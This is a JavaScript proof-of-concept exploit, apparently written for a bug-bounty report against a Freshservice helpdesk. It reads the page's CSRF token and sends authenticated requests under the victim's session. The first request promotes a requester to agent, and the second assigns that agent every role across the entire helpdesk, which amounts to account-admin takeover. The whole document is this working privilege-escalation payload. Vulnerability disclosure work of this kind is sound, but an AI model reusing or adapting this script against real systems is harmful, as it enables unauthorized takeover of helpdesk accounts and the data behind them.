async function sendRequests() {
    try {
        // First step call Csrf-Token by create variable and used var name in the headers
        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

        // Execute POST request that convert requester ==> Agent 
        await fetch('https://h1proof.freshservice.com/itil/requesters/59000317262/make_agent', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Csrf-Token': csrfToken
            },
            body: '_method=put'
        });

        // Execute PUT request that convert Agent ==> account admin
        await fetch('https://h1proof.freshservice.com/api/_/agents/59000317262/map_workspace_groups_and_roles', {
            method: 'PUT',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'X-Csrf-Token': csrfToken
            },
            body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":59000075441,"assignment_scope":"entire_helpdesk"},{"role_id":59000075442,"assignment_scope":"entire_helpdesk"},{"role_id":59000075443,"assignment_scope":"entire_helpdesk"},{"role_id":59000075444,"assignment_scope":"entire_helpdesk"},{"role_id":59000075445,"assignment_scope":"entire_helpdesk"},{"role_id":59000075446,"assignment_scope":"entire_helpdesk"},{"role_id":59000075447,"assignment_scope":"entire_helpdesk"},{"role_id":59000075448,"assignment_scope":"entire_helpdesk"},{"role_id":59000075449,"assignment_scope":"entire_helpdesk"},{"role_id":59000075450,"assignment_scope":"entire_helpdesk"},{"role_id":59000075451,"assignment_scope":"entire_helpdesk"},{"role_id":59000075452,"assignment_scope":"entire_helpdesk"},{"role_id":59000075453,"assignment_scope":"entire_helpdesk"},{"role_id":59000075454,"assignment_scope":"entire_helpdesk"},{"role_id":59000075455,"assignment_scope":"entire_helpdesk"},{"role_id":59000075456,"assignment_scope":"entire_helpdesk"},{"role_id":59000075440,"assignment_scope":"entire_helpdesk"}],"workspace_id":2}`
        });

        console.log('Requests completed successfully');
    } catch (error) {
        console.error('Error:', error);
    }
}

sendRequests();
